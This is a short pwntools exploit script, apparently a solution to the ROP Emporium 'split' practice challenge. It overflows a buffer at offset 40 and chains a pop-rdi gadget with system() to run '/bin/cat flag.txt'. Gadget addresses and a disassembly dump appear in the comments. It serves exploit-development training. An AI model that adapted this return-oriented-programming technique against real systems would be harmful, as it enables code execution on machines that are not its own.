#!/usr/bin/env python3

from pwn import *

exe = ELF("./split_patched")

context.binary = exe


def conn():
    if args.LOCAL:
        r = process([exe.path])
        if args.DEBUG:
            gdb.attach(r)
    else:
        r = remote("addr", 1337)

    return r


def main():
    r = conn()
    offset = 40
    bin_cat = 0x601060 #   $ search "/bin/cat"   0x601060 '/bin/cat flag.txt'
    system = 0x40074b
    # pwndbg> disass usefulFunction
    # Dump of assembler code for function usefulFunction:
    #    0x0000000000400742 <+0>:	push   rbp
    #    0x0000000000400743 <+1>:	mov    rbp,rsp
    #    0x0000000000400746 <+4>:	mov    edi,0x40084a
    #    0x000000000040074b <+9>:	call   0x400560 <system@plt>
    #    0x0000000000400750 <+14>:	nop
    #    0x0000000000400751 <+15>:	pop    rbp
    #    0x0000000000400752 <+16>:	ret
    # End of assembler dump.
    pop_rdi = 0x00000000004007c3 #  0x00000000004007c3 : pop rdi ; ret
    payload = flat({offset: [
            pop_rdi,
            bin_cat,
            system

        ]})

    r.sendlineafter(b'>', payload)

    # good luck pwning :)

    r.interactive()


if __name__ == "__main__":
    main()

